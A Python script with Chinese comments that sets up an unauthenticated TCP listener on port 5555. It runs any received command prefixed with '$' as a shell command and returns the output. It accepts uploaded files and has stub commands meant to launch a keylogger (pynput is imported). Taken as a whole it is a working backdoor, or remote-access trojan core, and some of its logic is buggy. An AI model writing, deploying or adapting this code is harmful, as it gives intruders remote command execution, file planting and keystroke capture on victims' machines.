
import socket
import os,time,struct
from pynput.keyboard import Key, Controller,Listener
ip = ""  # 空表示可连接所有主机
port = 5555  # 设置端口
from threading import Thread


def run_extend(exename):
    os.popen(exename)

while 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 对象s 使用基于tcp协议的网络套接字
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 关闭后不需要保存状态可以立即开启
    s.bind((ip, port))  # 对象s 开始绑定ip和端口
    s.listen(10)  # 启动监听状态，设置队列中等待连接服务器的最大请求数10
    conn, addr = s.accept()
    print("新的连接：",addr)
    while True:
        cmd=[]
        data2="无效命令\n"
        try:
            data = conn.recv(1024)  # 接收对方字符串 #如果对方不发数据会卡住
            print(data)
            print(len(data))
            if len(data)<=0 or data=="\n" or data=="\r" or data=="":
                print("对方发送了空数据")
                data2="你发送了空数据"
                break
            if data == b"q":
                break
            data = str(data, encoding="utf-8")
            if (data[0]=="$"):
                data=data.replace("$","")
                f = os.popen(data)  # 可以将命令的内容以读取的方式返回
                data2 = f.read()
            elif(data[0]=="@"):
                data=data.replace("@","")
                print(data)
                if data=="keylisten": 
                    run_extend("key")
                if data=="del_keylisten": 
                    run_extend("key")
            
            fileinfo_size = struct.calcsize('128sl')
            print(fileinfo_size)
            buf = conn.recv(fileinfo_size)
            if buf:
                        print("recv file")
                        filename, filesize = struct.unpack('128sl', buf)
                        print(filename, filesize)
                        fn = filename.strip('\00')
                        new_filename = os.path.join('./', 'new_' + fn)
                        recvd_size = 0  # 定义已接收文件的大小
                        fp = open(new_filename, 'wb')
                        while not recvd_size == filesize:
                            if filesize - recvd_size > 1024:
                                data = conn.recv(1024)
                                recvd_size += len(data)
                            else:
                                data = conn.recv(filesize - recvd_size)
                                recvd_size = filesize
                            fp.write(data)
                        fp.close()
                        data2="success"
            data=0
            #print(data2)
            conn.send(bytes(data2, encoding="gbk"))  # 发送命令运行结果
        except ConnectionResetError:
            print("远程主机强迫关闭了一个现有的连接。")
            time.sleep(1)
            break
        except OSError:
            print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
            time.sleep(1)
            break
    conn.close()  # 断开连接
    s.close()  # 关闭套结字
